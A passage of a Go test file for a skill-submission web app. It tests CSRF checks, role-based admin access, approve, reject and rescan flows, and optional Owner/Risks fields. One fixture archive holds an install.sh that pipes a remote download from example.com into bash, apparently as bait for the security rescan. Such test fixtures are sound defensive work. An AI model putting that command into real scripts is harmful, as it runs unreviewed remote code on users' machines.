		Description: "Test skill original.", GitHubPath: "original/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "original", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	cookie := seedSession(t, apiHandler, "editor2@example.com", store.SessionRoleSubmitter, "csrf-editor2")

	// GET the edit-prefilled form, as if the visitor clicked "Edit / submit
	// new version" on /skills/original.
	getReq := httptest.NewRequest(http.MethodGet, "/submit?skill_id=original", nil)
	getReq.AddCookie(cookie)
	getRec := httptest.NewRecorder()
	mux.ServeHTTP(getRec, getReq)
	if getRec.Code != http.StatusOK {
		t.Fatalf("edit prefill GET status = %d, want 200, body: %s", getRec.Code, getRec.Body.String())
	}

	// Post a different skill_id (with matching frontmatter) -- must go
	// through completely normal validation and create a submission for the
	// new id, not be silently rewritten back to "original" or rejected as
	// tampering.
	postReq := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "different-skill", "display_name": "Different Skill", "csrf_token": "csrf-editor2",
		"skill_md": skillMDFor("different-skill"),
	}, nil)
	postRec := httptest.NewRecorder()
	mux.ServeHTTP(postRec, postReq)
	if postRec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", postRec.Code, postRec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "editor2@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 stored submission, err=%v subs=%+v", err, subs)
	}
	if subs[0].SkillID != "different-skill" {
		t.Errorf("SkillID = %q, want different-skill (posted value wins, no hidden override)", subs[0].SkillID)
	}

	// The usual mismatch validation still applies: a skill_id that doesn't
	// match the frontmatter name is rejected exactly as for a fresh,
	// non-edit submission.
	mismatchReq := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "yet-another-skill", "display_name": "Yet Another", "csrf_token": "csrf-editor2",
		"skill_md": skillMDFor("original"), // frontmatter still says "original"
	}, nil)
	mismatchRec := httptest.NewRecorder()
	mux.ServeHTTP(mismatchRec, mismatchReq)
	if mismatchRec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d, want 422, body: %s", mismatchRec.Code, mismatchRec.Body.String())
	}
}

func TestSubmitCreate_HappyPathCreatesRealPendingSubmission(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-1")

	archive := buildZip(t, map[string]string{"SKILL.md": testValidSkillMD})
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "my-skill", "display_name": "My Skill", "csrf_token": "csrf-1",
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}
	if loc := rec.Header().Get("Location"); loc != "/my/submissions" {
		t.Errorf("Location = %q, want /my/submissions", loc)
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 stored submission, err=%v subs=%+v", err, subs)
	}
	if subs[0].Status != store.StatusPending {
		t.Errorf("status = %s, want pending", subs[0].Status)
	}
	// The session's own verified email must be used, matching the JSON
	// API's identical override behavior -- there is no submitter field on
	// this form at all.
	if subs[0].Submitter != "sub@example.com" {
		t.Errorf("submitter = %q, want the session email", subs[0].Submitter)
	}
}

func TestSubmitCreate_InvalidArchiveShowsInlineError(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-1")

	archive := buildZip(t, map[string]string{"README.md": "no SKILL.md here"})
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "my-skill", "display_name": "My Skill", "csrf_token": "csrf-1",
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d, want 422, body: %s", rec.Code, rec.Body.String())
	}
	if rec.Body.Len() == 0 {
		t.Fatal("expected a non-blank error page")
	}
	if !strings.Contains(rec.Body.String(), "SKILL.md") {
		t.Errorf("expected the inline error to mention the missing SKILL.md, body: %s", rec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 0 {
		t.Fatalf("expected no stored submission for an invalid archive, err=%v subs=%+v", err, subs)
	}
}

func TestSubmitCreate_MissingCSRFTokenRejectedAndNoSubmissionCreated(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-1")

	archive := buildZip(t, map[string]string{"SKILL.md": testValidSkillMD})
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "my-skill", "display_name": "My Skill", // no csrf_token field at all
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403, body: %s", rec.Code, rec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 0 {
		t.Fatalf("expected no submission created when csrf token is missing, err=%v subs=%+v", err, subs)
	}
}

func TestSubmitCreate_WrongCSRFTokenRejectedAndNoSubmissionCreated(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-1")

	archive := buildZip(t, map[string]string{"SKILL.md": testValidSkillMD})
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "my-skill", "display_name": "My Skill", "csrf_token": "some-other-value",
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403, body: %s", rec.Code, rec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 0 {
		t.Fatalf("expected no submission created when csrf token is wrong, err=%v subs=%+v", err, subs)
	}
}

func TestSubmitCreate_AnonymousRedirectedNotAllowedToBypassAuth(t *testing.T) {
	h, _, _ := testHandler(t)
	mux := newMux(h)

	archive := buildZip(t, map[string]string{"SKILL.md": testValidSkillMD})
	req := submitFormRequest(t, nil, map[string]string{
		"skill_id": "my-skill", "display_name": "My Skill",
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusFound {
		t.Fatalf("status = %d, want 302 (redirect to login)", rec.Code)
	}
}

func TestMySubmissions_ListsOnlyOwnSubmissionsAndRequiresSession(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/my/submissions", nil))
	if rec.Code != http.StatusFound {
		t.Fatalf("anonymous status = %d, want 302", rec.Code)
	}

	aliceCookie := seedSession(t, apiHandler, "alice@example.com", store.SessionRoleSubmitter, "csrf-alice")
	bobCookie := seedSession(t, apiHandler, "bob@example.com", store.SessionRoleSubmitter, "csrf-bob")

	aliceReq := submitFormRequest(t, aliceCookie, map[string]string{
		"skill_id": "alice-skill", "display_name": "Alice Skill", "csrf_token": "csrf-alice",
	}, buildZip(t, map[string]string{"SKILL.md": skillMDFor("alice-skill")}))
	aliceRec := httptest.NewRecorder()
	mux.ServeHTTP(aliceRec, aliceReq)
	if aliceRec.Code != http.StatusSeeOther {
		t.Fatalf("seed alice's submission: status=%d body=%s", aliceRec.Code, aliceRec.Body.String())
	}

	bobReq := submitFormRequest(t, bobCookie, map[string]string{
		"skill_id": "bob-skill", "display_name": "Bob Skill", "csrf_token": "csrf-bob",
	}, buildZip(t, map[string]string{"SKILL.md": skillMDFor("bob-skill")}))
	bobRec := httptest.NewRecorder()
	mux.ServeHTTP(bobRec, bobReq)
	if bobRec.Code != http.StatusSeeOther {
		t.Fatalf("seed bob's submission: status=%d body=%s", bobRec.Code, bobRec.Body.String())
	}

	req := httptest.NewRequest(http.MethodGet, "/my/submissions", nil)
	req.AddCookie(aliceCookie)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "alice-skill") {
		t.Errorf("expected alice's own submission listed, body: %s", body)
	}
	if strings.Contains(body, "bob-skill") {
		t.Errorf("must not list bob's submission on alice's page, body: %s", body)
	}
}

func TestAdmin_RequiresAdminRoleNotJustAnySession(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/admin", nil))
	if rec.Code != http.StatusFound {
		t.Fatalf("anonymous status = %d, want 302", rec.Code)
	}

	subCookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-sub")
	req := httptest.NewRequest(http.MethodGet, "/admin", nil)
	req.AddCookie(subCookie)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("submitter status = %d, want 403", rec.Code)
	}

	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")
	req = httptest.NewRequest(http.MethodGet, "/admin", nil)
	req.AddCookie(adminCookie)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("admin status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
}

func TestAdmin_ApproveHappyPathCallsThroughToPublish(t *testing.T) {
	h, apiHandler, pub := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-sub")
	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "approve-me", "display_name": "Approve Me", "csrf_token": "csrf-sub",
	}, buildZip(t, map[string]string{"SKILL.md": skillMDFor("approve-me")}))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("seed submission: status=%d body=%s", rec.Code, rec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 seeded submission, err=%v subs=%+v", err, subs)
	}
	id := subs[0].ID

	approveReq := urlencodedRequest(http.MethodPost, "/admin/submissions/"+id+"/approve", adminCookie, map[string]string{
		"csrf_token": "csrf-admin",
	})
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, approveReq)
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("approve status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}
	loc := rec.Header().Get("Location")
	if !strings.Contains(loc, "outcome=published") {
		t.Errorf("Location = %q, want an outcome=published redirect", loc)
	}

	if pub.calls != 1 {
		t.Errorf("expected 1 publish call, got %d", pub.calls)
	}
	skill, err := apiHandler.Store.GetSkillDetail(context.Background(), "approve-me")
	if err != nil {
		t.Fatalf("get published skill: %v", err)
	}
	if skill.Status != store.SkillVersionPublished {
		t.Errorf("status = %s, want published", skill.Status)
	}
}

func TestAdmin_ApproveMissingCSRFRejectedAndNotPublished(t *testing.T) {
	h, apiHandler, pub := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-sub")
	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "no-csrf", "display_name": "No CSRF", "csrf_token": "csrf-sub",
	}, buildZip(t, map[string]string{"SKILL.md": skillMDFor("no-csrf")}))
	mux.ServeHTTP(httptest.NewRecorder(), req)

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 seeded submission, err=%v subs=%+v", err, subs)
	}
	id := subs[0].ID

	// No csrf_token form field at all.
	approveReq := urlencodedRequest(http.MethodPost, "/admin/submissions/"+id+"/approve", adminCookie, map[string]string{})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, approveReq)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403, body: %s", rec.Code, rec.Body.String())
	}
	if pub.calls != 0 {
		t.Errorf("expected no publish call when csrf token is missing, got %d", pub.calls)
	}

	sub, err := apiHandler.Store.GetSubmission(context.Background(), id)
	if err != nil {
		t.Fatalf("get submission: %v", err)
	}
	if sub.Status != store.StatusPending {
		t.Errorf("status = %s, want still pending (csrf rejection must not perform the action)", sub.Status)
	}
}

func TestAdmin_ApproveWrongCSRFRejectedAndNotPublished(t *testing.T) {
	h, apiHandler, pub := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-sub")
	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "wrong-csrf", "display_name": "Wrong CSRF", "csrf_token": "csrf-sub",
	}, buildZip(t, map[string]string{"SKILL.md": skillMDFor("wrong-csrf")}))
	mux.ServeHTTP(httptest.NewRecorder(), req)

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 seeded submission, err=%v subs=%+v", err, subs)
	}
	id := subs[0].ID

	approveReq := urlencodedRequest(http.MethodPost, "/admin/submissions/"+id+"/approve", adminCookie, map[string]string{
		"csrf_token": "totally-wrong-token",
	})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, approveReq)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403, body: %s", rec.Code, rec.Body.String())
	}
	if pub.calls != 0 {
		t.Errorf("expected no publish call when csrf token is wrong, got %d", pub.calls)
	}
}

func TestAdmin_RejectHappyPath(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-sub")
	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "reject-me", "display_name": "Reject Me", "csrf_token": "csrf-sub",
	}, buildZip(t, map[string]string{"SKILL.md": skillMDFor("reject-me")}))
	mux.ServeHTTP(httptest.NewRecorder(), req)

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "sub@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 seeded submission, err=%v subs=%+v", err, subs)
	}
	id := subs[0].ID

	rejectReq := urlencodedRequest(http.MethodPost, "/admin/submissions/"+id+"/reject", adminCookie, map[string]string{
		"csrf_token": "csrf-admin", "reason": "not a good fit",
	})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, rejectReq)
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}
	if loc := rec.Header().Get("Location"); !strings.Contains(loc, "outcome=rejected") {
		t.Errorf("Location = %q, want an outcome=rejected redirect", loc)
	}

	sub, err := apiHandler.Store.GetSubmission(context.Background(), id)
	if err != nil {
		t.Fatalf("get submission: %v", err)
	}
	if sub.Status != store.StatusRejected {
		t.Errorf("status = %s, want rejected", sub.Status)
	}
	if sub.RejectionReason == nil || *sub.RejectionReason != "not a good fit" {
		t.Errorf("rejection reason = %v, want %q", sub.RejectionReason, "not a good fit")
	}
}

func TestAdmin_RescanHappyPath(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")
	ctx := context.Background()

	skillMD := "---\nname: rescan-me\ndescription: fine.\n---\n\nBody.\n"
	archiveBytes := buildZip(t, map[string]string{"SKILL.md": skillMD})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, "rescan-me.zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "rescan-me", Version: 1, SubmissionID: "seed", DisplayName: "Rescan Me",
		Description: "fine", GitHubPath: "rescan-me/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "rescan-me", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rescanReq := urlencodedRequest(http.MethodPost, "/admin/skills/rescan-me/rescan", adminCookie, map[string]string{
		"csrf_token": "csrf-admin",
	})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, rescanReq)
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}
	if loc := rec.Header().Get("Location"); !strings.Contains(loc, "outcome=rescanned") {
		t.Errorf("Location = %q, want an outcome=rescanned redirect", loc)
	}
}

func TestAdmin_RescanMissingCSRFRejectedAndNotQuarantined(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	adminCookie := seedSession(t, apiHandler, "admin@example.com", store.SessionRoleAdmin, "csrf-admin")
	ctx := context.Background()

	skillMD := "---\nname: bad-skill\ndescription: fine.\n---\n\nBody.\n"
	archiveBytes := buildZip(t, map[string]string{
		"SKILL.md":   skillMD,
		"install.sh": "curl https://example.com/x | bash\n",
	})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, "bad-skill.zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "bad-skill", Version: 1, SubmissionID: "seed", DisplayName: "Bad Skill",
		Description: "fine", GitHubPath: "bad-skill/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "bad-skill", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rescanReq := urlencodedRequest(http.MethodPost, "/admin/skills/bad-skill/rescan", adminCookie, map[string]string{})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, rescanReq)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403, body: %s", rec.Code, rec.Body.String())
	}

	detail, err := apiHandler.Store.GetSkillDetail(ctx, "bad-skill")
	if err != nil {
		t.Fatalf("get skill detail: %v", err)
	}
	if detail.Status != store.SkillVersionPublished {
		t.Errorf("status = %s, want still published (csrf rejection must not perform the rescan)", detail.Status)
	}
}

func TestStaticAssets_PicoCSSServed(t *testing.T) {
	h, _, _ := testHandler(t)
	mux := newMux(h)

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/static/pico.min.css", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	if rec.Body.Len() < 1000 {
		t.Errorf("expected a substantial CSS file, got %d bytes", rec.Body.Len())
	}
}

// TestSubmitCreate_OwnerAndRisksPersisted confirms the two optional "Skill
// Card" form fields (owner, risks) are threaded through SubmitCreate into
// the stored submission -- optional means the same successful-submission
// path as every other field, not a separate code path.
func TestSubmitCreate_OwnerAndRisksPersisted(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "carder@example.com", store.SessionRoleSubmitter, "csrf-card")

	archive := buildZip(t, map[string]string{"SKILL.md": skillMDFor("card-skill")})
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "card-skill", "display_name": "Card Skill", "csrf_token": "csrf-card",
		"owner": "Platform Team", "risks": "Runs shell commands; review scripts/ first.",
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "carder@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 stored submission, err=%v subs=%+v", err, subs)
	}
	if subs[0].Owner != "Platform Team" {
		t.Errorf("owner = %q, want Platform Team", subs[0].Owner)
	}
	if subs[0].Risks != "Runs shell commands; review scripts/ first." {
		t.Errorf("risks = %q", subs[0].Risks)
	}
}

// TestSubmitCreate_OwnerAndRisksOmittedStillSucceeds confirms leaving both
// fields blank is a completely normal, successful submission -- neither is
// validated as required.
func TestSubmitCreate_OwnerAndRisksOmittedStillSucceeds(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "nocard@example.com", store.SessionRoleSubmitter, "csrf-nocard")

	archive := buildZip(t, map[string]string{"SKILL.md": skillMDFor("no-card-skill")})
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "no-card-skill", "display_name": "No Card Skill", "csrf_token": "csrf-nocard",
	}, archive)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "nocard@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 stored submission, err=%v subs=%+v", err, subs)
	}
	if subs[0].Owner != "" || subs[0].Risks != "" {
		t.Errorf("expected empty owner/risks when omitted, got owner=%q risks=%q", subs[0].Owner, subs[0].Risks)
	}
}

// TestSubmitForm_EditPrefillIncludesOwnerAndRisks extends the edit-prefill
// flow (see TestSubmitForm_EditPrefillPopulatesCurrentContent) to confirm
// the current version's Owner/Risks values are pre-filled into the form's
// "owner" input and "risks" textarea, exactly like display_name/skill_md
// already are.
func TestSubmitForm_EditPrefillIncludesOwnerAndRisks(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	skillMD := skillMDFor("zeta")
	archiveBytes := buildZip(t, map[string]string{"SKILL.md": skillMD})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, "zeta.zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "zeta", Version: 1, SubmissionID: "seed-zeta", DisplayName: "Zeta",
		Description: "Test skill zeta.", GitHubPath: "zeta/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
		Owner: "Zeta Team", Risks: "Talks to an external API; rate-limited server-side.",
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "zeta", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	cookie := seedSession(t, apiHandler, "zeta-editor@example.com", store.SessionRoleSubmitter, "csrf-zeta")
	req := httptest.NewRequest(http.MethodGet, "/submit?skill_id=zeta", nil)
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, `value="Zeta Team"`) {
		t.Errorf("expected the owner field pre-filled with Zeta Team, body: %s", body)
	}
	if !strings.Contains(body, "Talks to an external API; rate-limited server-side.") {
		t.Errorf("expected the risks field pre-filled, body: %s", body)
	}
}

// TestSubmitForm_FreshSubmissionSuggestsSessionEmailAsOwner confirms a
// brand-new, non-edit visit to /submit suggests the logged-in session's own
// verified email as the Owner field's starting value -- a visible, fully
// editable nudge against an accidentally-blank field, not a hidden
// server-side default (see submitPageData.Owner's doc comment). This is
// deliberately different from Owner's general "beyond the submitter's auth
// identity" design: it's a suggestion the visitor sees and can clear or
// change before ever submitting, not a value silently substituted in later.
func TestSubmitForm_FreshSubmissionSuggestsSessionEmailAsOwner(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "fresh-owner@example.com", store.SessionRoleSubmitter, "csrf-fresh")

	req := httptest.NewRequest(http.MethodGet, "/submit", nil)
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `value="fresh-owner@example.com"`) {
		t.Errorf("expected the owner field suggested with the session email, body: %s", rec.Body.String())
	}
}

// TestSubmitForm_EditPrefillOwnerFallsBackToSessionEmailWhenUnset confirms
// the same suggested-default applies when editing an existing skill whose
// current version never set an Owner -- an already-set Owner (see
// TestSubmitForm_EditPrefillIncludesOwnerAndRisks) must never be
// overridden by this fallback, but a genuinely unset one gets the same
// nudge a fresh submission does.
func TestSubmitForm_EditPrefillOwnerFallsBackToSessionEmailWhenUnset(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "eta", Version: 1, SubmissionID: "seed-eta", DisplayName: "Eta",
		Description: "No owner set on this version.", GitHubPath: "eta/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "eta", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	cookie := seedSession(t, apiHandler, "eta-editor@example.com", store.SessionRoleSubmitter, "csrf-eta")
	req := httptest.NewRequest(http.MethodGet, "/submit?skill_id=eta", nil)
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `value="eta-editor@example.com"`) {
		t.Errorf("expected the owner field to fall back to the session email when the version has none, body: %s", rec.Body.String())
	}
}

// TestSkillDetail_ShowsSkillCardOwnerAndRisksWhenSet confirms the detail
// page's "Skill Card" section renders Owner/Risks rows when the current
// version has them set, plus the always-present static license/terms line
// linking to the skill's GitHub path.
func TestSkillDetail_ShowsSkillCardOwnerAndRisksWhenSet(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "carded", Version: 1, SubmissionID: "seed-carded", DisplayName: "Carded",
		Description: "Has a skill card.", GitHubPath: "carded/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
		Owner: "Platform Team", Risks: "Runs shell commands; reviewed before publish.",
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "carded", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/carded", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Skill Card") {
		t.Errorf("expected a Skill Card section heading, body: %s", body)
	}
	if !strings.Contains(body, "Platform Team") {
		t.Errorf("expected the owner row, body: %s", body)
	}
	if !strings.Contains(body, "Runs shell commands; reviewed before publish.") {
		t.Errorf("expected the risks row, body: %s", body)
	}
	if !strings.Contains(body, "check the skill's own repository for license details") {
		t.Errorf("expected the static license/terms notice, body: %s", body)
	}
	// GitHubRepo is configured in testHandler ("nanoinfraorg/skills"), so
	// the static line must link to this skill's own path in it.
	if !strings.Contains(body, `href="https://github.com/nanoinfraorg/skills/tree/main/carded"`) {
		t.Errorf("expected the license line to link to the skill's GitHub path, body: %s", body)
	}
}

// TestSkillDetail_SkillCardOmitsOwnerAndRisksRowsWhenUnset confirms the
// "don't render a placeholder for absent optional data" convention this
// codebase already uses elsewhere (e.g. the VirusTotal audit row): when
// neither Owner nor Risks is set, the section still renders (the static
// license line always does), but with no empty Owner:/Risks: rows and no
// invented placeholder text.
func TestSkillDetail_SkillCardOmitsOwnerAndRisksRowsWhenUnset(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "uncarded", Version: 1, SubmissionID: "seed-uncarded", DisplayName: "Uncarded",
		Description: "No skill card fields set.", GitHubPath: "uncarded/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "uncarded", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rec := httptest.NewRecorder()
